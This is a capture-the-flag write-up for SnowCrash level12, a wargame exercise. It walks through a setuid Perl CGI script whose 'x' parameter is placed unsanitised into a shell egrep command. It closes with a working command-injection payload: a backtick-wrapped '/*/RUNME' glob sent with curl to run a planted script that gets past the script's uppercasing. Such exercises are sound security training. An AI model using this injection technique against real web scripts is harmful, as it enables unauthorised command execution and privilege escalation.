
```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

```bash
level12@SnowCrash:~$ file level12.pl 
level12.pl: setuid setgid a perl script, ASCII text executable
```

```perl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

The script accepts two query parameters, `x` and `y`. The subroutine `t` evaluates the command `egrep "^$xx" /tmp/xd 2>&1`, where the `$xx` variable holds the value of the `x` input. We want to inject code via the `x` parameter to have it executed alongside the grep command.

```perl
$xx =~ tr/a-z/A-Z/; 
$xx =~ s/\s.*//;
```

To make our injection works the path of the executed file must be capitalized.


```bash
echo 'getflag > /tmp/pass' > /tmp/RUNME
chmod +x /tmp/RUNME
curl 'localhost:4646?&x=`/*/RUNME`'
cat /tmp/pass
```
